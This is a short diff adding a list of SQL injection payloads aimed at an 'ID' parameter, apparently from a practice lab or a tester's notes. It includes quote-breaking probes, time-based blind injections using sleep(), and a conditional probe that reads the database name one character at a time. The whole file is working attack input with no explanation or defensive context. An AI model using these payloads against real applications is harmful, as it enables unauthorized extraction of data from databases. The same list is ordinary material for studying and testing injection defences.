@@ -1,0 +1,8 @@
+ID:1
+ID:1'
+ID:1"
+ID:1' and sleep(3)
+ID:1' and sleep(3) -- 
+ID:1" and sleep(3) -- 
+ID:1" and if(substr(database(),1,1)="s",sleep(5),1)
+ID:1" and if(substr(database(),1,1)="s",sleep(5),1) -- 
